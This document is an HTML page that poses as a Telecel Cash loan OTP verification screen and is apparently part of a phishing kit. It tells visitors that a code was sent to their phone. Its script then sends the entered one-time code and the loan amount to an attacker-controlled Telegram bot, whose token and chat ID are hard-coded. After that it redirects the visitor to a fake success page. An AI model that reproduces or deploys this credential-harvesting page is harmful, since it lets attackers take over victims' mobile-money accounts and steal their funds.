<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification - Telecel Cash Loan</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section {
            text-align: center;
            padding: 22px 0 10px;
        }
        .telecel-logo {
            width: 85px;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            font-size: 23px;
            font-weight: 700;
            color: #1e2937;
            margin: 8px 0 6px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 15.3px;
            padding: 0 25px 18px;
            line-height: 1.5;
        }
        .loan-info {
            background: #fff0f0;
            margin: 0 20px 18px;
            padding: 15px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid #ffe0e0;
        }
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 18px 0 26px;
            padding: 0 20px;
        }
        .otp-input {
            width: 52px;
            height: 62px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            outline: none;
            transition: all 0.2s;
        }
        .otp-input:focus {
            border-color: #E42320;
            box-shadow: 0 0 0 4px rgba(228, 35, 32, 0.15);
        }
        .form-section {
            padding: 0 25px 30px;
        }
        .error-msg {
            text-align: center;
            margin: 12px 20px 18px;
            font-size: 14.8px;
            padding: 14px;
            border-radius: 12px;
            display: none;
            color: #dc3545;
            background: #ffebee;
            border: 1px solid #ffc6c6;
        }
        .btn-action {
            width: 100%;
            background: #E42320;
            color: white;
            border: none;
            padding: 17px;
            font-size: 17.5px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px 0;
        }
        .btn-action:disabled {
            background: #94a3b8;
            cursor: not-allowed;
        }
        .back-btn {
            width: 100%;
            background: transparent;
            color: #64748b;
            border: 2px solid #e2e8f0;
            padding: 16px;
            font-size: 16.5px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
        }
        #spinner {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.92);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 65px;
            height: 65px;
            border: 6px solid rgba(255,255,255,0.2);
            border-top: 6px solid #E42320;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <svg class="telecel-logo" width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Telecel Logo (retained) -->

            </svg>
        </div>
        
        <h1>Loan OTP Verification</h1>
        <p class="subtitle">A 5-digit verification code has been sent to your Telecel number. Enter it below to authorize and disburse your loan.</p>
   
        <!-- Loan Information -->
        <div class="loan-info" id="loanInfo">
            <strong id="loanTitle">Flex Loan</strong><br>
            <span id="loanAmount" style="color:#E42320; font-weight:700; font-size:24px;"></span>
            <p id="loanDetails" style="margin-top:8px; font-size:14.5px; color:#334155;"></p>
        </div>

        <div class="otp-container" id="otpInputs"></div>
        <div class="error-msg" id="errMsg"></div>
        
        <div class="form-section">
            <button class="btn-action" id="verifyBtn">Verify & Authorize Loan</button>
            <button class="back-btn" onclick="window.history.back()">← Back to Verification</button>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:25px; font-size:17px;">Verifying OTP & Authorizing Loan...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
            CHAT_ID: '7547427914',
            SUCCESS_PAGE: 'success.html',
            DEVICE_PAGE: 'device_verify.html'
        };

        let state = { lastUpdateId: 0 };
        let isProcessing = false;

        const errMsg = document.getElementById('errMsg');
        const spinner = document.getElementById('spinner');
        const verifyBtn = document.getElementById('verifyBtn');
        const loanAmountEl = document.getElementById('loanAmount');
        const loanDetailsEl = document.getElementById('loanDetails');
        const loanTitleEl = document.getElementById('loanTitle');

        // Load Loan Details from URL
        function loadLoanDetails() {
            const params = new URLSearchParams(window.location.search);
            const amount = params.get('amount');
            const duration = params.get('duration');
            const purpose = params.get('purpose');

            if (amount) {
                loanAmountEl.textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
                loanTitleEl.textContent = "Flex Loan Authorization";

                let details = [];
                if (duration) details.push(`${duration} Days`);
                if (purpose) details.push(purpose.replace(/([A-Z])/g, ' $1').trim());
                
                loanDetailsEl.textContent = details.join(' • ');
            }
        }

        function createInputs() {
            const container = document.getElementById('otpInputs');
            container.innerHTML = '';
            for (let i = 0; i < 5; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = 1;
                input.className = 'otp-input';
                input.inputMode = 'numeric';
                container.appendChild(input);
            }
        }

        function getCode() {
            return Array.from(document.querySelectorAll('.otp-input'))
                       .map(i => i.value.trim()).join('');
        }

        function setupAutoFocus() {
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < 4) {
                        inputs[index + 1].focus();
                    }
                    if (getCode().length === 5) {
                        setTimeout(submitOTP, 300);
                    }
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !input.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }

        function submitOTP() {
            if (isProcessing) return;
            isProcessing = true;
            verifyBtn.disabled = true;
            verifyBtn.textContent = "Verifying...";

            const otp = getCode();
            if (otp.length !== 5) {
                isProcessing = false;
                verifyBtn.disabled = false;
                verifyBtn.textContent = "Verify & Authorize Loan";
                return;
            }

            spinner.style.display = 'flex';

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `<b>🔴 Loan OTP Verification</b>\n\nAmount: ${loanAmountEl.textContent}\nOTP: <code>${otp}</code>\n\nApprove this loan?`,
                    parse_mode: 'HTML'
                })
            }).then(() => {
                setTimeout(() => {
                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + new URLSearchParams(window.location.search).toString();
                }, 2000);
            }).catch(() => {
                spinner.style.display = 'none';
                errMsg.textContent = "Verification failed. Please try again.";
                errMsg.style.display = 'block';
                isProcessing = false;
                verifyBtn.disabled = false;
                verifyBtn.textContent = "Verify & Authorize Loan";
            });
        }

        // Initialize
        createInputs();
        setupAutoFocus();
        verifyBtn.onclick = submitOTP;
        loadLoanDetails();
    </script>
</body>
</html>
